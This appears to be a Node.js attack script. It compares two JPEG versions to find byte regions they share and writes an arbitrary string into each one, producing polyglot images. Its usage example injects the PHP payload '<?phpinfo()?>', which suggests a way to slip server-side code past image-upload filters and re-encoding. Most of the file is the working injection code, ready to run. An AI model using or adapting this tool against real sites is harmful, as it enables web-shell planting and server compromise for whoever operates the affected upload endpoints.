const fs = require('fs')
const path = require('path')
const del = require('del')
const mkdirp = require('mkdirp')
const split = require('just-split')
const diff = require('diff-sequences').default

const OUTPUT_DIR = path.resolve(__dirname, './vendors/inject-output')

function getReady () {
  del.sync(OUTPUT_DIR)
  mkdirp.sync(OUTPUT_DIR)
}

async function inject (str, filePaths) {
  getReady()

  const files = filePaths.map((p) => fs.readFileSync(p, 'hex'))
  const sequences = files.map((file) =>
    split(file.split(''), 2).map((arr) => arr.join(''))
  )

  const injection = Buffer.from(str).toString('hex')
  const size = injection.length

  let areas = []

  console.log(`Searching diff areas...`)

  diff(
    sequences[0].length,
    sequences[1].length, (l, r) => sequences[0][l] === sequences[1][r],
    (len, l, r) => {
      if (len > size / 2) {
        areas.push(l)
      }
    }
  )

  console.log(`${areas.length} areas found.`)

  let output = []

  areas.forEach((position, index) => {
    let hex = [...sequences[0]]
    for (let i = 0; i < size; i += 2) {
      hex[position + i / 2] = injection[i] + injection[i + 1]
    }
    let buf = Buffer.from(hex.join(''), 'hex')
    let p = path.resolve(OUTPUT_DIR, `${index}.jpg`)
    fs.writeFileSync(p, buf)
    output.push(p)
  })

  console.log(`Injection finished. Check ${OUTPUT_DIR}`)

  return output
}

if (module.parent) {
  module.exports = inject
  return
}

/**
 * Usages:
 *
 * ```sh
 * node ./inject.js [content] [file1] [file2]
 * ```
 *
 * Example:
 *
 * ```sh
 * node ./inject.js "<?phpinfo()?>" ./vendors/190413104517_315539082.jpg ./vendors/190413104640_171516771.jpg
 * # <- Searching diff areas...
 * # <- 11 areas found.
 * # <- Injection finished. Check ./vendors/injected/
 * ```
 *
 */
;(async () => {
  let paths = process.argv.slice(3, 5).map((p) =>
    path.resolve(process.cwd(), p)
  )
  await inject(process.argv[2], paths)
})()
